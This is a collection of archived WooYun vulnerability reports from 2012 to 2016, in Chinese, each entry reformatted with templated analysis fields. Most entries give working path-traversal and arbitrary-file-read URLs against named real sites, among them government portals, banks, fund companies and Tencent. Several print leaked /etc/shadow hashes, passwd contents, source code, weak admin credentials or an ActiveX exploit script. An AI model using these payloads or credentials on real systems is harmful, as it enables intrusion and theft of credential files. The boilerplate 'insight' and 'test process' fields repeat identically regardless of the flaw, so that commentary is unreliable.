**详情**: 首先说一下CRM系统地址：http://211.100.37.7/http://211.100.37.7/.svn/entries  这里泄露源码文件。如图这里要说一下，为什么说是后台CRM系统源码呢。因为直接访问http://211.100.37.34/login.do    不多说，你懂的。任意文件读取：http://211.100.37.7/resin-doc/viewfile/?contextpath=/&servletpath=&file=index.jsp

**POC**: ----------下面是漏洞证明----------

**绕过**: 直接利用

**修复**: 源码看完就删了。。。 没做保留！！！ 这么大的厂商居然给小rank。。。醉了。
---

---
### [wooyun-2013-037165] 苹果园配置不当 存在代码执行漏洞导致1000万+用户信息告急
**厂商**: 苹果园 | **年份**: 2013 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 上传功能

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: #1 漏洞存在域名苹果园论坛http://bbs.app111.com#2 漏洞信息nginx 配置不当，导致代码执行，虽然设置了个人头像远程部署，论坛附件远程上传但是还是存在疏忽的地方，通过一些猥琐的手段，导致可上传附件并利用http://iosfile.feng91.com/album/cover/9b/15.jpghttp://bbs.app111.com/data/attachment/album/cover/9b/15.jpg#3 PHPINFO 信息泄露http://bbs.app111.com/test.php#4 SVN 信息泄露http://bbs.app111.com/data/.svn/entries8dir2860http://svn.pcpop.com/svn/searchbbs/bbs/it168/ios/trunk/data_disthttp://svn.pc

**POC**: #5 漏洞利用[*] 基本信息 [ 	Linux applebbs-web.it168.com 2.6.18-238.19.1.el5 #1 SMP Fri Jul 15 07:31:24 EDT 2011 x86_64(nobody) ][/data/www/ios20/data/]$ /sbin/ifconfig -aeth0      Link encap:Ethernet  HWaddr A4:BA:DB:29:D8:B9inet addr:61.**.***.143  Bcast:61.**.***.255  Mask:255.255.255.0UP BROADCAST RUNNIN

**绕过**: 直接利用

**修复**: 针对提出的安全问题逐一解决。
---

---
### [wooyun-2013-023588] 广联任意文件下载漏洞
**厂商**: glpay.com.cn | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞页面：http://www.glpay.com.cn/?act=download参数：path利用：http://www.glpay.com.cn/?act=download&path=../../../etc/passwd这样如果path指定的文件不存在，就会爆出网站的绝对路径，如果文件存在，将下载文件的内容。这些信息会在下载下来的文件中体现。

**POC**: 爆路径：http://www.glpay.com.cn/?act=download&path=../../../etc/passwd下载文件: http://www.glpay.com.cn/?act=download&path=../../../../etc/passwd

**绕过**: 直接利用

**修复**: 对传入的page参数进行过滤,对信息输出进行处理.
---

---
### [wooyun-2016-0191794] P2P金融安全之齐鲁银行绑定任意银行卡/任意文件读取
**厂商**: 齐鲁银行 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 0x1:未经任何验证机制绑定任意用户银行卡号：在网上随意找几个用户绑定测试：6228480402564890018   农业银行-借记卡6222021001116245702   工商银行-借记卡输入银行卡卡号，添加成功：测试从此账户中转入100元：

**POC**: 0x2:任意文件读取：/https://**.**.**.**/DisplayImage.do?path=../../../../../../../../../../../../../../../../etc/passwd

**绕过**: 直接利用

**修复**: 做权限验证，参数做过滤
---

---
### [wooyun-2014-048164] 福建省某政府站任意文件下载
**厂商**: 福建省人民政府公报室 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://218.85.73.164:8088/infogate/file/file_server_read.jsp?FileName=/../../../../../../../../../etc/shadowroot:$1$/.PXy4CV$cFeNNrcTL/L9PgM.D328Z0:16028:0:99999:7:::bin:*:14547:0:99999:7:::daemon:*:14547:0:99999:7:::adm:*:14547:0:99999:7:::lp:*:14547:0:99999:7:::sync:*:14547:0:99999:7:::shutdown:*:14547:0:99999:7:::halt:*:14547:0:99999:7:::mail:*:14547:0:99999:7:::news:*:14547:0:99999:7:::uucp:*:

**POC**: 如上。看文件名是trs系统下面的，测试了其他几个trs，并不一定有这文件。

**绕过**: 直接利用

**修复**: 检测路径吧。
---

---
### [wooyun-2015-0113760] 台湾行政院環境保護署政府某分站任意文件下载
**厂商**: Hitcon台湾互联网漏洞报告平台 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://doc.epa.gov.tw/IFDEWebBBS_EPA/Download.ashx?path=C:\Windows\System32\drivers\etc\&file=hosts

**POC**: # Copyright (c) 1993-2009 Microsoft Corp.## This is a sample HOSTS file used by Microsoft TCP/IP for Windows.## This file contains the mappings of IP addresses to host names. Each# entry should be kept on an individual line. The IP address should# be placed in the first column followed by the corres

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2014-061389] 中国中小企业赤峰网任意文件读取
**厂商**: 中国中小企业赤峰网 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.smecf.gov.cn/editor/Dialog/play.asp?raiz=E:\WWWROOT\SME\Editor

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-017855] 交通银行某服务器多处安全威胁
**厂商**: 交通银行 | **年份**: 2013 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 认证接口

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 风险一、iis短文件名图上亮点自己找，附上我猜到其中的一个sql文件下载截图：风险二、源码泄漏没错，就是asp....看源码需要场景配合，不过conn.asp源码无果，猜测是墙捣鬼，求交行管理员指教.风险三、FCKeditor风险一中的一处亮点，版本为 2.6.3风险四、暴力破解不知道admin/admin能不能登录，无验证码，挂上字典跑跑风险应该还是有的:

**POC**: 风险一、iis短文件名图上亮点自己找，附上我猜到其中的一个sql文件下载截图：风险二、源码泄漏没错，就是asp....看源码需要场景配合，不过conn.asp源码无果，猜测是墙捣鬼，求交行管理员指教.风险三、FCKeditor风险一中的一处亮点，版本为 2.6.3风险四、暴力破解不知道admin/admin能不能登录，无验证码，挂上字典跑跑风险应该还是有的:

**绕过**: 直接利用

**修复**: 鉴于以上问题是在粗略浏览情况下发现的，不排除还存在其他重大风险，故加固事宜建议咨询贵行安全工程师或@ wooyun 任意白帽子，我想贵行在看到我账户余额后，应该不好意思免费咨询我:)
---

---
### [wooyun-2013-028095] 贵州某政府网站存在任意文件下载漏洞
**厂商**: 贵州省某政府网站 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 贵州省卫生厅存在存在任意文件下载漏洞http://www.gzwst.gov.cn随便进入一个下载页面，下载时用burp抓包http://www.gzwst.gov.cn/SysHTML/ArticleHTML/12738_1.shtml修改文件名即可以任意下载文件并且还为root权限，可以下载shadow文件

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 进行权限设置，以及下载目录设置
---

---
### [wooyun-2015-0141241] 陕西省宝鸡市政府网站任意文件下载
**厂商**: 陕西省宝鸡市政府 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 大牛审过，没过好多次，想拿个账号这么难下载系统上的文件/etc/shadow和其他系统上档案：http://**.**.**.**/download?fileName=..%2f..%2f..%2f..%2fetc%2fpasswd

**POC**: 下载系统上的文件/etc/shadow和其他系统上档案：http://**.**.**.**/download?fileName=..%2f..%2f..%2f..%2fetc%2fpasswd

**绕过**: 直接利用

**修复**: 大牛比我懂
---

---
### [wooyun-2015-0104065] TCCMSV9.0 最新版本地文件包含
**厂商**: teamcen.com | **年份**: 2015 | **类型**: 文件包含

**元思考**: 触发信号: 参数注入

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: public function Run() {$this->Analysis();$this->control = $_GET['c'];$this->action = $_GET['a'];if ($_GET['a'] === "list") {$this->action = "listAll";}//子目录支持$dir = '';if (isset($_GET['d'])) {$dir .= $_GET['d'].'/';}$adminDir = '/controller/';if (defined('IN_ADMIN')) {$adminDir = '/admin/';}//子模块支持$module = strcmp(MODULE, "/") == 0 ? 'app' : MODULE;$controlFile = ROOT_PATH . '/' . $module . $admin

**POC**: 在网站根目录下添加一个测试的txt文件:POC:http://192.168.152.160/tccms/index.php?d=../../1.txt%00

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0161629] 国药多站漏洞(弱口令+目录遍历)
**厂商**: 国药集团 | **年份**: 2015 | **类型**: 后台弱口令

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目标1：http://www.sinopharm-sd.com/存在fck，但是无法利用发现弱口令一枚后台：http://www.sinopharm-sd.com/admin/admin_login.aspx用户名/密码：admin/admin上传的地方貌似都禁止掉了目标2：http://www.gykgah.cn/目录遍历http://www.gykgah.cn/aspnet_client/system_web/http://www.gykgah.cn/aspnet_client/http://www.gykgah.cn/data/http://www.gykgah.cn/images/

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 贵集团旗下很多网站,oa系统都是弱口令
---

---
### [wooyun-2016-0170387] 信雅达某系统存在2处任意文件下载漏洞
**厂商**: sunyard.com | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://120.199.7.135/services.jsp这2个红圈处存在任意文件下载http://120.199.7.135/downloadContract.action?inputPath=%2FWEB-INF%2Fweb.xml

**POC**: http://120.199.7.135/downloadProtocol.action?inputPath=%2FWEB-INF%2Fweb.xml

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2012-07004] 优酷某处目录遍历
**厂商**: 优酷 | **年份**: 2012 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 手机优酷文件下载目录遍历：http://w.go.youku.com/widget/

**POC**: phpinfo()：http://w.go.youku.com/widget/nokia/n97/api/test.php

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-087369] 重庆文理学院机房环境监控系统弱口令网站文件目录权限管控不严格
**厂商**: 重庆文理学院 | **年份**: 2014 | **类型**: 后台弱口令

**元思考**: 触发信号: 功能测试

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 今天在无聊扫网段的时候扫到的这个，于是乎就开始研究，先是发现这个管理系统网站目录权限管控不严格，可以下载网站目录的任意文件，然后就开始猜这个系统的管理员密码！神马123456,神马567890都试了还是不对，暂时放弃了猜解~然后就无聊的分析那个rc.local文件，就在无聊透顶的时候去试试了一个密码~~尼玛呀( ⊙ o ⊙ )！居然是6个1这个密码！！！不管那个等进去玩一玩，其实这个监控管理控制台被非法控制的话影响还是比较大的，里面涉及到了机房监控报警和烟感的控制，最厉害的是机房门禁的控制，通过这个控制台可以打开机房的大门，想进就进想出就出~~~~不！安！全！PS:(这个监控系统ftp也是匿名访问不用建议取消)http://222.179.99.154/

**POC**: 机房的布局各种温度状态各种看，还可以取消报警想进机房大门的找我~我给你们开门哈你只有5秒钟的进门时间！进去就别想出来！！机房内所有设备的信息网站根目录权限管控不严

**绕过**: 直接利用

**修复**: 1、类似这种监控系统可以限制外网访问2、严禁使用弱口令3、加强目录权限的管控4、完了~~~
---

---
### [wooyun-2015-0145826] 钢之家任意文件读取
**厂商**: 钢之家 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: code地址：http://mail2011.steelhome.cn/login.php?Lang=../../../../../../../../../../etc/passwd%00.jpg

**POC**: root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:

**绕过**: 直接利用

**修复**: 加强过滤啊
---

---
### [wooyun-2015-0114978] p2p金融精融汇任意文件读取漏洞
**厂商**: 精融汇 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: p2p金融精融汇存在目录遍历漏洞可遍历到passwd和shadow文件

**POC**: 漏洞地址：http://www.iafclub.com/picView?picno=../../../../../../../../../../../../../sbin/../etc/passwd%00f.jpg开个burp跑一下目录字典权限很高可以跑出shadow文件还可以读到系统的网络配置信息还有系统的访问日志

**绕过**: 直接利用

**修复**: 。。。。。。
---

---
### [wooyun-2014-051243] 某电子邮件系统安全控件文件下载、运行、覆盖等 + 绕过该控件可登录系统
**厂商**: 成都某公司 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 成都三零盛安信息系统有限公司龙信使Ⅱ安全增强电子邮件系统 ActiveX控件可以下载任意地址文件到%tmp%的任意相对路径SanMailBHO.HttpService：downloadFileWithUrl可以运行本地任意文件并获得执行结果SanMailBHO.MailServiceFactory：openLocalFile可以复制本地任意文件到%tmp%的任意相对路径可以判断本地任意文件是否存在SanMailBHO.MailAttachment：SetFileIsLocalFileExistLoadLocalFileSaveToNoPrompt可以判断本地任意文件大小SanMailBHO.MailServiceFactory：GetFileSize验证：mail.30san.com

**POC**: <script>var mailService = new ActiveXObject("SanMailBHO.MailServiceFactory");var httpForm = new ActiveXObject("SanMailBHO.HttpForm");var httpService = new ActiveXObject("SanMailBHO.HttpService");var usbkeyService = new ActiveXObject("SanMailBHO.UsbkeyService");var mailAttachment = new ActiveXObject(

**绕过**: 直接利用

**修复**: 不安装控件，绕过该控件登录系统在登录页打开控制台：window.mylogin = function(user,domain,psw){var md5pwd = hex_md5(psw);$.ajax({type : "POST"url : "/servlet/LoginServlet"dataTy
---

---
### [wooyun-2013-040003] 福建省人民政府某系统任意文件下载漏洞
**厂商**: 福建省人民政府办公厅 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: exphttp://218.85.73.166:8081/inforadar/jsp/util/file_download.jsp?filePath=../../../../../../../etc/passwd

**POC**: root:$1$yrccsO.Y$3rZIYN**********09G/:14814:0:99999:7:::bin:*:14814:0:99999:7:::daemon:*:14814:0:99999:7:::adm:*:14814:0:99999:7:::lp:*:14814:0:99999:7:::sync:*:14814:0:99999:7:::shutdown:*:14814:0:99999:7:::halt:*:14814:0:99999:7:::mail:*:14814:0:99999:7:::news:*:14814:0:99999:7:::uucp:*:14814:0:99

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0131617] 某市人力资源和社会保障局存在任意文件下载漏洞（可读取shadow密码）
**厂商**: 大庆市人力资源和社会保障局 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.dqhr.gov.cn/fileDownload.jsp?fileName=../../../../../etc/passwdhttp://www.dqhr.gov.cn/fileDownload.jsp?fileName=../../../../../etc/shadowpasswdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/s

**POC**: 如上

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0157236] 南方基金某系统存在任意文件下载漏洞
**厂商**: 南方基金管理有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://cconline.southernfund.com:8080/live800/downlog.jsp?path=/&fileName=/etc/passwd

**POC**: http://cconline.southernfund.com:8080/live800/downlog.jsp?path=/&fileName=/etc/shadowhttp://cconline.southernfund.com:8080/live800/downlog.jsp?path=/&fileName=/root/.bash_history

**绕过**: 直接利用

**修复**: 补丁
---

---
### [wooyun-2015-093111] 重庆市科技计划项目管理系统文件下载漏洞（可下载jsp源码）
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞url:http://xmgl.cstc.gov.cn/kwxmgl/jsp/nosession/download.jsp?filename=download.jsp<form name="Form1" method="post" action="http://xmgl.cstc.gov.cn/kwxmgl/jsp/nosession/download.jsp" id="Form1"><input type="text" name="filename" value="download.jsp"/><input type="submit" value="go"/></form>

**POC**: <%@page language="java" contentType="application/x-msdownload" import="java.io.*,java.net.*" pageEncoding="gb2312"%><%String filename = request.getParameter("filename");//ÎÄ¼þÃûString filepath = this.getClass().getClassLoader().getResource("/").getPath();//Â·¾¶//filepath="http://"+request.getServerN

**绕过**: 直接利用

**修复**: 额，修复方案就不解释了，找开发的吧
---

---
### [wooyun-2012-07326] 腾讯某子站文件包含后续引发任意文件下载
**厂商**: 腾讯 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 两子站：http://dnfcity.qq.com/http://xxzcity.qq.com/http://xxzcity.qq.com/helpCenter.do?itemId=../../WEB-INF/web.xml%00&captionType=whelp从web.xml 中。<servlet-mapping><servlet-name>DownloadServlet</servlet-name><url-pattern>/servlet/download</url-pattern></servlet-mapping>可以发现可以下载文件的。http://dnfcity.qq.com/servlet/download?filename=WEB-INF/classes/hetaimall-config.propertieshttp://xxzcity.qq.com/servlet/

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你懂得！
---

---
### [wooyun-2014-079300] 山西省安全生产应急管理平台任意文件下载
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 普通下载连接http://glpt.sxaj.gov.cn/Design/pages/YingMa/news/downfile.aspx?FilePath=~https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/20120427/129799872737343750.doc重新构造成http://glpt.sxaj.gov.cn/Design/pages/YingMa/news/downfile.aspx?FilePath=~/web.config直接下载downfile.aspx.cs处理代码查看protected void Page_Load(object sender, EventArgs e){FileDownload(FilePath);}public string FilePath{get{string temp =Serv

**POC**: (见原文)

**绕过**: 直接利用

**修复**: xx
---

---
### [wooyun-2015-0144595] 应用服务器glassfish存在通用任意文件读取漏洞
**厂商**: glassfish | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 无意中发现glassfish存在通用的任意文件读取漏洞，如下（你问我怎么无意？我才不会告诉你我是扫出来的呢。。）http://localhost:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd这么长是因为java把"%c0%ae"解析为"\uC0AE"，最后转义为ASCCII字符"."zoomeye上的结果在国内有23000+,当然实际有效的可能没这么多，不过安全无小事不是吗？：）试了几个，应该是一些小站，通知不了的话就打下码吧。。\  \  \\

**POC**: 如上

**绕过**: 直接利用

**修复**: 。。。
---

---
### [wooyun-2013-018425] trs inforadar 任意文件读取漏洞
**厂商**: trs | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在做项目的过程中发现了inforadar的任意文件读取漏洞/inforadar/jsp/file/file_download.jsp?fileType=file&fileName=../../../../../../../../../../../../../../etc/passwd

**POC**: 在做项目的过程中发现了inforadar的任意文件读取漏洞/inforadar/jsp/file/file_download.jsp?fileType=file&fileName=../../../../../../../../../../../../../../etc/passwd

**绕过**: 直接利用

**修复**: 过滤吧
---

---
### [wooyun-2015-0145070] 唐山市交通运输局官网任意文件下载漏洞
**厂商**: 唐山市交通运输局 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 【获取网站路径】http://**.**.**.**/cyportal//DownloadTemplateFile?operate=all全部模板导出成功 请保存!,template 2015-10-06 19:49:03.xml,E:/apache-tomcat-tangshanjt/webapps/cyportal/TempFile/【下载web.xml】**.**.**.**/cyportal/DownloadServlet?filePath=E:/apache-tomcat-tangshanjt/webapps/cyportal/WEB-INF/&templateName=web.xml

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-025514] 安徽农业大学某学院备份文件下载，包括数据库等信息
**厂商**: 安徽农业大学 | **年份**: 2013 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 安徽农业大学某学院的网站，将网站备份文件放在网站目录下，可直接下载，其中包括了数据库连接文件等敏感信息。http://ahndskxb.ahau.edu.cn/wwwroot.zip<add key="category_id" value="nykxxbjzhl"/><add key="issn" value="1672-352X"/><add key="LogDir" value="d:\\all_file\\ahnydxxbzr\\log\\"/><add key="TempDir" value="d:\\all_file\\ahnydxxbzr\\temp\\"/><add key="ConfigDir" value="d:\\wwwroot\\ahnydxxbzr\\config\\"/><add key="MailDir" value="d:\\all_file\\ahnydxx

**POC**: 俺未进行下一步测试，只到此为止了。并且已经删除下载的文件。

**绕过**: 直接利用

**修复**: 尽快转移阵地。
---

---
### [wooyun-2013-045441] 慧聪网某服务任意文件下载
**厂商**: 慧聪网 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: zimbra 漏洞http://hcmail.hc360.com/zimbra/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../etc/passwd

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 官方补丁
---

---
### [wooyun-2015-0104987] 某旅行社管理系统默认文件下载可进后台
**厂商**: 深山工作室 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某旅行社管理系统默认文件下载可进后台。源码：深山旅行社管理系统 v2.5下载地址：http://down.chinaz.com/soft/28252.htm默认数据库文件可被下载，利用进入后台。默认数据库地址：/datas/data.mdb可谷歌搜索：深山 inurl:line_list.asp?sid=案例：http://www.tcxzh.com//datas/data.mdbhttp://www.yyczl.com//datas/data.mdbhttp://www.hshuanyu.com//datas/data.mdbhttp://www.hshuanyu.com//datas/data.mdbhttp://pymslxs.com//datas/data.mdbhttp://www.jjulx.com//datas/data.mdbhttp://www.bhld0532.com/

**POC**: 证明：

**绕过**: 直接利用

**修复**: 。。。
---

---
### [wooyun-2015-0145569] 某省政府数据开放平台任意文件下载
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/download.jsp?filename=../../../../../../../etc/passwd  未过滤用户输入导致任意文件下载，可下载主机passwd和shadow文件及网站配置文件。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 过滤用户输入
---

---
### [wooyun-2015-0104508] 某市敏感部门备份文件下载可获取敏感信息
**厂商**: 某市敏感部门 | **年份**: 2015 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: mask 区域*****w.bjgaj.gov.*****

**POC**: mask 区域*****febc366fd4132f66ca1b893.jp*****

**绕过**: 直接利用

**修复**: 删除
---

---
### [wooyun-2015-093311] 17173分站存在目录文件遍历下载漏洞
**厂商**: 17173游戏 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: GET /ajax/getajaxinfo.php?url=file:///etc/passwd&Work=getnewsinfo HTTP/1.1Referer: http://love.17173.com/Cookie: PHPSESSID=ipkuh1uiis820ivl5uted8f0r7Host: love.17173.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0117960] 鹏华基金网站某处任意文件下载
**厂商**: 鹏华基金 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.phfund.com.cn/Downloader?filePath=/WEB-INF/web.xmlroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinnews:x:9

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
